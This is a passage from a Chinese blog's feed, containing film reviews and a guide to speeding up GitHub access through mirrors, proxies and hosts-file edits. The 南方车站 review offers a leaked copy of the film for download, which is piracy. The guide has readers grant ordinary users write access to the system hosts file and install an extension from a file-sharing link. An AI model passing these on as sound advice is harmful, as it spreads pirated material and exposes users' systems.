    <summary type="html">&lt;h2 id=&quot;何为优秀&quot;&gt;&lt;a href=&quot;#何为优秀&quot; class=&quot;headerlink&quot; title=&quot;何为优秀?&quot;&gt;&lt;/a&gt;何为优秀?&lt;/h2&gt;&lt;p&gt;知名编剧张小北说，好的电影，技术层面上要有突破，&lt;strong&gt;内容层面要有情怀与灵魂&lt;/strong&gt;，最重要的是，能</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【电影】南方车站的聚会</title>
    <link href="https://seniortesting.club/posts/Se2wVompY5/"/>
    <id>https://seniortesting.club/posts/Se2wVompY5/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>南方某城市，重案队长刘队（廖凡 饰）重金悬赏在逃罪犯周泽农（胡歌 饰）。陪泳女刘爱爱（桂纶镁 饰） 、周泽农曾经的好友华华（奇道 饰）、五年未见的妻子杨淑俊（万茜 饰），各色人等各怀心事，相继被卷入这场罪与罚的追击旋涡。冒险与爱情，人性与救赎，这场特别的“聚会”该如何收场？善恶有道一念之间。<br>　　中国导演刁亦男曾凭借前作《白日焰火》获第 64届柏林国际电影节最佳影片金熊奖，凭本片入围第 72届戛纳国际电影节主竞赛单元</p><p>警察之死属于误杀，在一定程度上消解了他身上的邪性；他知道自身难保，而甘愿让妻子举报自己后领30万赏金，以便更好地带着孩子生活，以及刘爱爱被人强奸时，他用铁棍敲死强奸犯，这些都体现了他重视情义；他与窃匪搏斗、骑车飞奔的镜头则表现了其勇猛顽强的一面。胡歌的明星效应所带来的气场，也能让观众们先入为主地体悟到这个角色的风骨——这也是刁亦男选择有偶像身份的胡歌的重要原因之一。与此同时，周泽农身上的光环性也让“逃犯”、“杀人犯”、“孤胆英雄”三重身份在他身上浑融一体，这种亦正亦邪的人物形象不仅没有落入主旋律叙事的窠臼，也能在唤起观众的情感认同的同时，从他的悲剧结局中体会到城市与人生的绝望，从而对电影内容产生共鸣。</p><p>他误杀了警察，而不得不沦为了亡命之徒；又因为被纳入30万的重金悬赏而被迫卷入犯罪团伙的殊死搏斗。作为一个自始至终都没有希望的人，周泽农的行动都是他在陷入命运泥沼时的无奈挣扎。</p><p>周泽农是众叛亲离的。华华、马哥等人都为了利益而出卖了他；几个好兄弟都死于非命。在整场电影中，他虽然一直打听妻子的下落，却自始至终从未和妻子、孩子见过面，仿佛和自己的家人生活在两个世界。有其在车站的那几场戏里，长焦镜头通过模糊背景将周泽农与他的周围环境隔绝成两个世界，从能指的角度暗示他的疏离感。</p><p>周泽农的死亡并没有被影片浓墨重彩地表现。他很快就被警察用数枪打死，中弹倒地的他吃力地攀爬身体，试图躲进池塘里，但他很快就丧命，身子依然在岸上，只有脑袋埋在水面上。虽然周泽农之死是电影的高潮，但是电影却依旧保持着平静的格调，稍作点缀的背景音乐并没有引燃电影的叙事基调，它只是用单调的声音渲染着逃犯中弹的惊悚氛围，且被连续响亮的枪声掩盖着。在他被打死后，电影镜头只停留了数秒，便切换到下一个场面——短促的电影时间和朴素的镜头语言抑制住了男主角之死应有的冲击力，一条终结的生命就这样被冷漠无情的茫茫黑色叙事所吞没，这场死亡在过分压抑的叙事手法中似乎变成了平淡的小事，也折射着其如蝼蚁般的卑微人生。</p><p>作者：踏歌<br>链接：<a href="https://www.zhihu.com/question/275394888/answer/924889242" target="_blank" rel="noopener">https://www.zhihu.com/question/275394888/answer/924889242</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><ol><li>大哥，借个火，是刘爱爱对周泽农说的第一句话。刘爱爱是华华的人，受他委派找周泽农，但周泽农一开始不信她，刘爱爱说“如果是警察不用那么麻烦”。2. 周泽农手下是黄毛，他这边是华华 – 常朝 -杨志烈（杨淑俊的弟弟），在帮派里的敌对方是猫眼 - 猫耳。整个帮派老大是马哥。但在故事展开中，周泽农，陪泳女刘爱爱，妻子杨淑俊，华华、马哥、猫眼猫耳都各有算盘，互相提防互相追逐。谁背叛了谁？谁是谁的人？谁在什么时候知道什么？谁知不知道谁知道？不断揣摩和猜测构成了观影体验中最有意思的部分之一。3. 周泽农在逃亡中先接触的人是杨志烈，杨志烈把周泽农要见妻子的愿望转达给华华，华华派刘爱爱去纺织厂，随后在家具厂找到了杨淑俊。4. 周泽农去宠物医院取弹头时隔壁床上还卧着一只巨型犬，以巨型犬做手术来掩盖周泽农的踪迹。5. 杨淑俊一边在家具厂工作一边带着儿子。华华跟着刘爱爱去了家具厂，但镜头一转，楼上抽烟的人从华哥变成了一个陌生人——也许是猫耳，也许是警察。6. 影片沉浸在南方潮湿的黑夜和氤氲的雾气里，在静水流深中观者随时提防着下一次的爆裂——枪声。片中有多处模拟枪声的巨响，爆米花的炸裂声，球砸中墙的声音，热水瓶砸到地上的声音，拍黄瓜声，都让人仿佛与故事中的人一起经历着危机四伏的世界。枪响是真的？——有可能只是背景的声音，可能只是隔壁人深夜外出；枪响是假的？——但随时可能是真的，猫耳中枪了，杨志烈被打死了，常朝也死于抢下。7. 刘爱爱带着杨淑俊去馄饨店找周泽农，馄饨店周围的警察穿着带荧光色边的鞋子跳广场舞。荧光鞋底应当是警察的统一标记，影片接近末尾旅馆抓捕，警官（廖凡）说自己人都戴头盔，可见警察有自己身份标志。8. 警官夜间去搜查杨淑俊家是他们第二次见面。警官编了一个周泽农的相好，想让杨淑俊全盘交代，但杨淑俊没全说实话。她隐匿了刘爱爱的存在，把告诉她消息、带她去馄饨店的事情都推到了当时已经死去的杨志烈头上。9. 影片开头马哥划分地盘与警官安排人手抓捕呼应暗合。周泽农带着人马夜间骑摩托和猫耳竞赛，与景观带着手下骑摩托车在夜间抓人是第二次暗合。10. 周泽农仔细盘算过对方举报拿到赏金的方式。本打算去火车站（第二次），临了意识到陪泳女在火车站举报逃亡者太不合情理，恰好躲过了警察从常朝那儿得到消息后的包围。11. 周泽农和刘爱爱去野鹅湖上游玩去留证据。 情欲之后给了她带着血迹的钱。一方面是证据，一方面切断了暧昧的情愫和气氛。逢场作戏，大概本以为逢场作戏之下是有情有心的。12. 影片中多次出现飞翔的意象，周泽农手上海鸥的纹身，刘爱爱包上的拉链挂坠，旧报纸画面中最后定格的飞机。但周泽农是一个不再有未来，不再有天空的人。13. 另一边，猫耳也想抓住周泽农独吞三十万赏金。有个镜头是华华与猫眼密谋，暗示华华把周泽农的行踪透露给了猫耳以及马哥。（但华华无论是想要帮周泽农还是只想要这笔钱，都不应该把这个消息让更多人知道。他和敌对方通气的目的让我不太能理解）14. 因此，周泽农在小旅馆302里看到的不是刘爱爱，而是守株待兔的猫眼猫耳和马哥。周泽农瞬间怀疑是刘爱爱背叛了他，或是华华背叛了他，或是刘爱爱一开始就是猫耳的人。刘爱爱用“都是他们叫我做的”含糊过去。15. 周泽农用透明雨伞杀人，开头用电动车锁打斗，说明他已经在刀口舔血的生活滚打良久，但即使如此，他的眼神和体态仍然与这个世界格格不入。16. 两碗牛肉面。周泽农狼吞虎咽，夹起一大坨面就往嘴里塞，一是因为他逃亡良久长期靠背包里的面包过活，很久没吃过热汤热饭。二是因为他知道这是他最后一顿饭了。刘爱爱问他，吃什么，面还是粉，他有片刻犹豫，或许也因为这个。17. 周泽农自那个雨夜便沉沦于泥泞，从影片一开始就在奔向最后的死亡。18. 刘爱爱是意外进入这个故事中的人。如华华几个在巷子里所说，杨淑俊举报是案犯家属配合办案，华华或者常朝都有案底，举报是线人戴罪立功，刘爱爱成了最理想的人选。19. 片子到末尾，最有意思的猜测是，到底是周泽农和刘爱爱的规划，亦或是刘爱爱和杨淑俊的合谋。两种解释都成立，我可能有些倾向于后者（否则刘爱爱不会如此惊慌于周泽农的追逐）。一部充满了鲜血打斗和荷尔蒙的片子中，有隐隐的姐妹情谊。20. 刘爱爱接受表彰去银行取钱，是整个片子唯一一次白天。</li></ol><h2 id="触动人的镜头"><a href="#触动人的镜头" class="headerlink" title="触动人的镜头"></a>触动人的镜头</h2><ul><li>周泽农追猫耳的路上黄毛惨死的镜头</li><li>第一次在夜店附近碰头的枪杀镜头</li><li>周泽农和刘爱爱在湖上被口的镜头</li><li>周泽农被出卖后在房间里杀死猫眼猫耳兄弟的血腥镜头</li><li>桂纶镁饰演的刘爱爱被强奸的镜头</li><li>周泽农最后吃面的镜头</li><li>周泽农被追杀打死后爬向水塘的镜头</li><li>周泽农死后警察对着尸体合影留念的镜头</li><li>国产电影中死的人最多的，黄毛，警察叔叔，杨志列，旅店老板在广场舞那里死掉了；华华，猫眼猫耳被杀，农哥；筒子楼那里有个邻居被猫眼误杀了；强奸犯闫哥；</li></ul><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><p>目前有网上泄露的戛纳电影节版本的，共计106分钟的，国内上映的版本是113分钟的。如果需要观看资源，请联系博主。发送邮件至： <a href="mailto:&#x61;&#x6c;&#x74;&#x65;&#114;&#x68;&#117;&#50;&#x30;&#50;&#x30;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x61;&#x6c;&#x74;&#x65;&#114;&#x68;&#117;&#50;&#x30;&#50;&#x30;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a></p><p>——————–下载地址———————</p><ul><li>下载地址： <a href="https://res.seniortesting.club/movies/%E5%8D%97%E6%96%B9%E8%BD%A6%E7%AB%99%E7%9A%84%E8%81%9A%E4%BC%9A.mp4" target="_blank" rel="noopener">南方车站的聚会</a></li></ul><h2 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>在查看相关的这个影评的时候，发现同类型的两个片子《路边野餐》和《地球最后的夜晚》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;南方某城市，重案队长刘队（廖凡 饰）重金悬赏在逃罪犯周泽农（胡歌 饰）。陪泳女刘爱爱（桂纶镁 饰） 、周泽农曾经的好友华华（奇道 饰）、五年</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【电影】双瞳</title>
    <link href="https://seniortesting.club/posts/lguiuld9ek/"/>
    <id>https://seniortesting.club/posts/lguiuld9ek/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>作者：萌 . 李（来自豆瓣）<br>来源：<a href="https://movie.douban.com/review/7265467/" target="_blank" rel="noopener">https://movie.douban.com/review/7265467/</a></p><p>双瞳》这部电影，算是中国恐怖片中的佼佼者，在我心中是中国恐怖片中最好的一部。剧情上大家各有偏差，一个人一个看法，而我所理解的剧情，是这样的，无论对与不对，好与不好，都是我个人理解，希望能帮助没看懂的人。</p><pre><code>谢亚理和她的姐姐，前世本是交阯的两位道人，他们在交阯真仙观修炼了许久之后，要渡劫才能升仙。两人于当世可能无法渡劫，所以投胎转世，双生在一母体中。再投胎之前，两人已经安排好了转世之后升仙渡劫的所有事情，由出土的石碑可以看出，谢亚理正是按照石碑上的图去寻找人魈的名字的。姐姐的那位道人可能修为比较高，所以在母体中的时候就已经得道升仙（谢亚理后来跟医生说的话中得知），她的劫可能就是母亲难产，她死亡（升仙）。而谢亚理活了下来，继续前世的安排，一步一步的升仙，她的一步一步就是通过双瞳寻找人魈（犯了罪恶，不人不鬼的人），把人魈打入地狱，然后自己升华。由石碑和黄火土的分析得出，人魈的名字分别是“富——妙——景——旺”，然后是一位“不信鬼神者”，谢亚理毕竟还未成仙，所以必须要有人帮助她才能完成这一步一步的计划。除她姐姐暗中帮助之外，她还找到了她前世的弟子，也就是两位海归博士，林道生和黄一锋。之所以认为这两人前世就是他们的弟子，是因为他们的名字推测而来。谢亚理找到了这一世有钱有科技的弟子，让弟子去找信徒从而帮助她杀人魈，并且把真仙观带到自己身边，帮助自己闭关修炼。谢亚理腹部的虫菌，之所以要用谢亚理的身体来培养，就是因为谢亚理是仙身，在她身上培养的虫菌，才能让人的幻觉按照她的意图来实现，这也是为什么每一个受害者所看到的幻觉是不同的原因。学者说“在道教一派中，主张地狱有五种，就是寒冰狱，火坑狱，抽肠狱，剜心狱，还有拔舌狱，经过五狱劫数试炼后，就是第六道，修炼成仙”。而人魈只有双瞳才能看到，所以谢亚理通过双瞳找到了人魈，并把人魈推入五狱试炼。而人魈的名字必须按照石碑上的对应名才可以。所以就是富（工业污染的大老板）进寒冰狱，妙（破坏家庭的情妇）进火坑狱，景（走私军火的景教传播者）进抽肠狱，旺（不孝贪财的孽子）进剜心狱，FBI（不信鬼神者）进拔舌狱。这五道试炼后，就是石碑的第三张“少阳太阴”，学者说了“从天干地支图里，少阳太阴代表两种节气，这两种气，代表从五月到七月，也代表火和土”。所以，最后这个少阳太阴，说的就是我们的主角——黄火土。其实谢亚理和姐姐一开始就找到了黄火土，妹妹被劫持的时候，子弹90度转弯，就是谢亚理的姐姐暗中操作的，谢亚理的姐姐虽然成仙了，但是也要继续帮助谢亚理成仙，所以谢亚理小时候说能看到姐姐，所以后来妹妹去医院时候，自己跑去看姐姐的标本而不是谢亚理，因为当时操作子弹的是姐姐。黄火土说妹妹看到了鬼，看到的其实不是鬼，而是仙。后来妹妹一直不说话，也是姐姐不希望妹妹把看到自己的事情说出来扰乱计划，所以才暂时不让妹妹说话。而姐姐为什么要保护妹妹，其实是在保护黄火土。在最后黄火土和谢亚理对战的时候，谢亚理给黄火土看了一段幻像，就是子弹打中了妹妹的头，而后来黄火土妻子也因为这个自杀了，像黄火土这么爱妻子和女儿的人，如果妻女都因为他的举报而死了，他也一定不会活下去了。所以如果谢亚理姐姐没有操作子弹，黄火土会死，就不能在后来为谢亚理所利用。谢亚理给他看这段，也是提醒他，其实我这是我们早就安排好的，我们一直在暗中保护着你。很多人纠结谢亚理的信徒们为什么要对警察大开杀戒，其实就是保护谢亚理飞升而已，尤其是林道生和黄一锋，他们身为前世的弟子更是要加紧保护谢亚理飞升，这很好理解，因为他们对谢亚理深信不疑，很虔诚，所以不存在姐姐对他们的控制和谢亚理对他们的迷幻。在五狱试炼之后，就是谢亚理引黄火土杀了自己，送自己最后的飞升，谢亚理说的很明白，“你是来送我的吧来吧”，所有的幻境都是为了让黄火土向自己开枪，送自己，幻境里很明显的传达了，如果你不开枪，救了我，妹妹将永远不说话，你的家庭永远不会幸福。最后“少阳太阴”终于开了枪，送谢亚理完成了飞升。其实黄火土本来也可以因助仙人飞升而也随着仙人一起飞升，为什么他和那些人魈一样都是助谢亚理飞升，那些人魈却不能飞升，因为那些是人魈，他们在道德上有所败坏，当然不能成仙，而黄火土是一个正直善良的人，他助仙人飞升的根基就不一样，而且他是最重要的一环，他是难得的“少阳太阴”，所以他可以随谢亚理一起飞升，如谢亚理临走之前所说，“你也会跟我一起走”。可是黄火土心中有爱，他在妻女的召唤下，放弃了飞升，重回了人间。因为爱，他没有飞升成功。这也是最后碑文上说“因爱生忧，因爱生惧，若离于爱者，无忧亦无惧”。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘录&quot;&gt;&lt;a href=&quot;#摘录&quot; class=&quot;headerlink&quot; title=&quot;摘录&quot;&gt;&lt;/a&gt;摘录&lt;/h2&gt;&lt;p&gt;作者：萌 . 李（来自豆瓣）&lt;br&gt;来源：&lt;a href=&quot;https://movie.douban.com/review/7265467/</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【港片】大隻佬</title>
    <link href="https://seniortesting.club/posts/mShGiI02t2/"/>
    <id>https://seniortesting.club/posts/mShGiI02t2/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大只佬感想"><a href="#大只佬感想" class="headerlink" title="大只佬感想"></a>大只佬感想</h2><p>不是前世今生。那个日本兵不是李凤仪。李凤仪不是那个日本兵。只是日本兵杀了人，李凤仪就要死．<br>那个日本造的恶因，后面的人必然会有恶果．而还这个的恶果的人可能是下世的自己．可能是张三．也可能是任何一个人．但是在影片中是倒霉的李凤仪．他来偿还哪个日本兵的因．<br>别人的恶因为什么其他人来偿还恶果，我做的因不一定是我来偿还果．那我为什么还做善事，做恶也报应不到我的头上．<br>结恶因必得恶果，日本兵，虐狗的小孩，被打死的师弟都是这个道理．<br>但是又有几个人看出结善因必得善果的道理？那个印度阿三师兄救过一只要死的甲虫，这个就是善因．而那个女人不知任何原因也要帮那个印度阿三这个就是善果．这段剧情大只佬说那两个人会死，是大只佬错了，那只甲虫没有死，印度阿三救了她一命只是没有救下左臂．所以今生她救了印度阿三一命，还了左臂．影片中甲虫是在水中被救，而她是在洗手间救的印度阿三，因果报应．<br>再说说那个瓶子，老太太拣到了它就是一个因果的结束，同时也是另一个因果的开始．<br>两个大只佬同样能看到因果，只是解决的方法不同，就出现了两个结果，也同时代表了两个开始，一个是恶因一个是善因，两个方法都可以使一个因果结束，但是之后的因果呢？就会出现不同的结局了．＂佛只看重因＂就是这个意思了．<br>影片结尾李凤仪说：希望以后不会再有人杀人　没有人结恶因自然就没有恶果．<br>大只佬变瘦，并且没有杀孙果他用善的方法结束了一段因果．如果世人都用原谅的方法去结束恶果那就不会出现恶因了．</p><h2 id="解析因果报应"><a href="#解析因果报应" class="headerlink" title="解析因果报应"></a>解析因果报应</h2><p><a href="https://movie.douban.com/review/8296854/" target="_blank" rel="noopener">（最全面准确深入的分析）从时辰未到到唯有业随身-电影《大只佬》中的佛教因果律探析（转）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;大只佬感想&quot;&gt;&lt;a href=&quot;#大只佬感想&quot; class=&quot;headerlink&quot; title=&quot;大只佬感想&quot;&gt;&lt;/a&gt;大只佬感想&lt;/h2&gt;&lt;p&gt;不是前世今生。那个日本兵不是李凤仪。李凤仪不是那个日本兵。只是日本兵杀了人，李凤仪就要死．&lt;br&gt;那个日本造的恶因，</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【意剧】我的天才女友</title>
    <link href="https://seniortesting.club/posts/Ljp2htQDEo/"/>
    <id>https://seniortesting.club/posts/Ljp2htQDEo/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最早是在豆瓣电影中推荐看到的，看了评分居然达到了9.6分，而且评分人数达到了1万两千多截止到2020年2月28日。这个真的很不错了。全剧讲述的是意大利小镇上一对好闺蜜的人生故事，像极了安妮宝贝高阶版本的“七月与安生”。。如果感兴趣的话可以到<a href="http://wanwansub.com/info/343" target="_blank" rel="noopener">弯弯字幕组</a>观看全集。</p><h2 id="感人台词"><a href="#感人台词" class="headerlink" title="感人台词"></a>感人台词</h2><p>恩佐对莉拉的表白:</p><blockquote><blockquote><p>“莉拉，我很爱你，从我们很小的时候，我就开始爱你。但我从来都没有告诉过你，因为你很漂亮，也很聪明，我却很矮，也很丑，我太渺小了。现在，你回到你丈夫那里去。我不知道你为什么会离开他，我也不想知道。我只知道，你不能待在这里，你不应该生活在这个糟糕的环境里。我陪你到你们家楼下，我等着你。假如他对你不好，我就上去把他杀了；假如他不打你，他很高兴你回去，那就算了。我们说好了，假如你和你丈夫过不下去，是我把你带回去的，我会把你接走。好吗？”</p></blockquote></blockquote><ul><li>米凯莱索拉拉真的是书中一直要否定的街区恶势力之首，代表着强权腐朽、女性备受压迫的社会病根，是莉拉一生抗争的原因。、</li><li>每个女人的青春里，或多或少都会有这样的闺蜜。她或许满身光环，或许美貌与才华集于一身，或许变成人生赢家，或许永远是个陪衬。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;p&gt;最早是在豆瓣电影中推荐看到的，看了评分居然达到了9.6分，而且评分人数达到了1万两千多截止到2020年2月28日。这个真的很不错了。全剧讲述</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>如何提高国内访问Github的速度到2MB/s以上</title>
    <link href="https://seniortesting.club/posts/iNoJxW4O2p/"/>
    <id>https://seniortesting.club/posts/iNoJxW4O2p/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月27日整理发布多种GitHub加速方式！</p><h2 id="1-GitHub-镜像访问"><a href="#1-GitHub-镜像访问" class="headerlink" title="1. GitHub 镜像访问"></a>1. GitHub 镜像访问</h2><p>这里提供两个最常用的镜像地址：</p><ul><li><a href="https://github.com.cnpmjs.org/" target="_blank" rel="noopener">https://github.com.cnpmjs.org</a></li><li><a href="https://hub.fastgit.org/" target="_blank" rel="noopener">https://hub.fastgit.org</a></li></ul><p>也就是说上面的镜像就是一个克隆版的Github，你可以访问上面的镜像网站，网站的内容跟Github是完整同步的镜像，然后在这个网站里面进行下载克隆等操作。</p><h2 id="2-GitHub文件加速"><a href="#2-GitHub文件加速" class="headerlink" title="2. GitHub文件加速"></a>2. GitHub文件加速</h2><p>利用 Cloudflare Workers 对<code>github release</code> 、<code>archive</code> 以及项目文件进行加速，部署无需服务器且自带CDN.</p><p><a href="https://gh.api.99988866.xyz/" target="_blank" rel="noopener">https://gh.api.99988866.xyz</a><br><a href="https://g.ioiox.com/" target="_blank" rel="noopener">https://g.ioiox.com</a></p><p>以上网站为演示站点，如无法打开可以查看开源项目：<a href="https://hunsh.net/archives/23/" target="_blank" rel="noopener">gh-proxy-GitHub 文件加速</a>自行部署。</p><h2 id="3-Github-加速下载"><a href="#3-Github-加速下载" class="headerlink" title="3. Github 加速下载"></a>3. Github 加速下载</h2><p>只需要复制当前 GitHub 地址粘贴到输入框中就可以代理加速下载！</p><p>地址：<a href="http://toolwa.com/github/" target="_blank" rel="noopener">http://toolwa.com/github/</a></p><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200728200127-2020-07-28.png" alt="20200728200127-2020-07-28"></p><h2 id="4-加速你的-Github"><a href="#4-加速你的-Github" class="headerlink" title="4. 加速你的 Github"></a>4. 加速你的 Github</h2><p><a href="https://github.zhlh6.cn/" target="_blank" rel="noopener">https://github.zhlh6.cn</a></p><p>输入 Github 仓库地址，使用生成的地址进行 git ssh 等操作</p><h2 id="5-谷歌浏览器GitHub加速插件-推荐"><a href="#5-谷歌浏览器GitHub加速插件-推荐" class="headerlink" title="5. 谷歌浏览器GitHub加速插件(推荐)"></a>5. 谷歌浏览器GitHub加速插件(推荐)</h2><p><a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/mfnkflidjnladnkldfonnaicljppahpg/related?hl=zh-CN" target="_blank" rel="noopener">谷歌浏览器Github加速插件.crx 下载</a></p><p>百度网盘: <a href="https://pan.baidu.com/s/1qGiIUzqNlN1ZczTNFbPg0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1qGiIUzqNlN1ZczTNFbPg0A</a>,提取码：<strong>stsv</strong></p><p>如果可以直接访问谷歌商店，可以访问<a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/mfnkflidjnladnkldfonnaicljppahpg" target="_blank" rel="noopener">GitHub 加速谷歌</a>商店安装。</p><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200728195907-2020-07-28.png" alt="20200728195907-2020-07-28"></p><h2 id="6-GitHub-raw-加速"><a href="#6-GitHub-raw-加速" class="headerlink" title="6. GitHub raw 加速"></a>6. GitHub raw 加速</h2><p>GitHub raw 域名并非 github.com 而是 <a href="raw.githubusercontent.com">raw.githubusercontent.com</a>，上方的 GitHub 加速如果不能加速这个域名，那么可以使用 Static CDN 提供的反代服务。</p><p>将 <a href="raw.githubusercontent.com">raw.githubusercontent.com</a> 替换为 <a href="raw.staticdn.net">raw.staticdn.net</a> 即可加速。</p><h2 id="7-GitHub-Jsdelivr"><a href="#7-GitHub-Jsdelivr" class="headerlink" title="7. GitHub + Jsdelivr"></a>7. GitHub + Jsdelivr</h2><p>jsdelivr 唯一美中不足的就是它不能获取 exe 文件以及 Release 处附加的 exe 和 dmg 文件。</p><p>也就是说如果 exe 文件是附加在 Release 处但是没有在 code 里面的话是无法获取的。所以只能当作静态文件 cdn 用途，而不能作为 Release 加速下载的用途。</p><h2 id="8-通过Gitee中转fork仓库下载"><a href="#8-通过Gitee中转fork仓库下载" class="headerlink" title="8. 通过Gitee中转fork仓库下载"></a>8. 通过Gitee中转fork仓库下载</h2><p>网上有很多相关的教程，这里简要的说明下操作。</p><ol><li><p>访问gitee网站： <a href="https://gitee.com/" target="_blank" rel="noopener">https://gitee.com/</a> 并登录，在顶部选择“从GitHub/GitLab导入仓库”<br>如下：<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200728200449-2020-07-28.png" alt="20200728200449-2020-07-28"></p></li><li><p>在导入页面中粘贴你的Github仓库地址，点击导入即可：<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200728200636-2020-07-28.png" alt="20200728200636-2020-07-28"></p></li><li><p>等待导入操作完成，然后在导入的仓库中下载浏览对应的该GitHub仓库代码，你也可以点击仓库顶部的“刷新”按钮进行Github代码仓库的同步。</p></li></ol><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200728200955-2020-07-28.png" alt="20200728200955-2020-07-28"></p><h2 id="9-通过修改HOSTS文件进行加速"><a href="#9-通过修改HOSTS文件进行加速" class="headerlink" title="9. 通过修改HOSTS文件进行加速"></a>9. 通过修改HOSTS文件进行加速</h2><p><a href="https://code.seniortesting.club/blog/2020/How-To-Speed-Github.html#%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98github%E7%9A%84%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%EF%BC%9F" target="_blank" rel="noopener">参考如下详细介绍</a></p><hr><h2 id="为什么github下载速度这么慢？"><a href="#为什么github下载速度这么慢？" class="headerlink" title="为什么github下载速度这么慢？"></a>为什么github下载速度这么慢？</h2><p>GitHub 我们都知道是世界上最大的开源及私有软件项目的托管平台，全世界每天有海量优秀的开源软件在这里产生，而 GitHub 在国内很多时候获取到的下载链接是亚马逊的服务器。</p><p>中国因为不可言说的原因，经常抽疯或龟速。想要加快 GitHub 下载速度就需要用到 GitHub 国内加速服务，对于有条件的可以使用代理加快访问速度，而没有条件的就可以用到网上热心人士维护的加速服务了。</p><h2 id="如何提高github的下载速度？"><a href="#如何提高github的下载速度？" class="headerlink" title="如何提高github的下载速度？"></a>如何提高github的下载速度？</h2><p>手动把cdn和ip地址绑定。</p><h3 id="第一步：获取github的global-ssl-fastly地址"><a href="#第一步：获取github的global-ssl-fastly地址" class="headerlink" title="第一步：获取github的global.ssl.fastly地址"></a>第一步：获取github的global.ssl.fastly地址</h3><p>访问：<a href="http://github.global.ssl.fastly.net.ipaddress.com/#ipinfo" target="_blank" rel="noopener">http://github.global.ssl.fastly.net.ipaddress.com/#ipinfo</a><br>获取cdn和ip域名：<br><img src="http://p1.pstatp.com/large/pgc-image/04bff14df4a24b27a3c560790365fa23" alt="无法显示"></p><p>得到：199.232.69.194  <a href="https://github.global.ssl.fastly.net/" target="_blank" rel="noopener">https://github.global.ssl.fastly.net</a></p><h3 id="第二步：获取github-com地址"><a href="#第二步：获取github-com地址" class="headerlink" title="第二步：获取github.com地址"></a>第二步：获取github.com地址</h3><p>访问：<a href="https://github.com.ipaddress.com/#ipinfo" target="_blank" rel="noopener">https://github.com.ipaddress.com/#ipinfo</a><br>获取cdn和ip：<br><img src="http://p1.pstatp.com/large/pgc-image/a746a0ec88294a668cd6446437021310" alt="无法显示图片"></p><p>得到：140.82.114.4 <a href="http://github.com/" target="_blank" rel="noopener">http://github.com</a></p><h3 id="第三步：修改host文件映射上面查找到的IP"><a href="#第三步：修改host文件映射上面查找到的IP" class="headerlink" title="第三步：修改host文件映射上面查找到的IP"></a>第三步：修改host文件映射上面查找到的IP</h3><p>windows系统：</p><p>1、修改<a href="C:\Windows\System32\drivers\etc\hosts">C:\Windows\System32\drivers\etc\hosts</a>文件的权限，指定可写入：</p><p>右击-&gt;hosts-&gt;属性-&gt;安全-&gt;编辑-&gt;点击Users-&gt;在Users的权限“写入”后面打勾。如下：<br><img src="http://p3.pstatp.com/large/pgc-image/67de012d4d5d45b4bc52873c0f3199f8" alt="无法显示"></p><p>然后点击确定。</p><p>2、右击-&gt;hosts-&gt;打开方式-&gt;选定记事本（或者你喜欢的编辑器）-&gt;在末尾处添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">199.232.69.194 github.global.ssl.fastly.net</span><br><span class="line"></span><br><span class="line">140.82.114.4 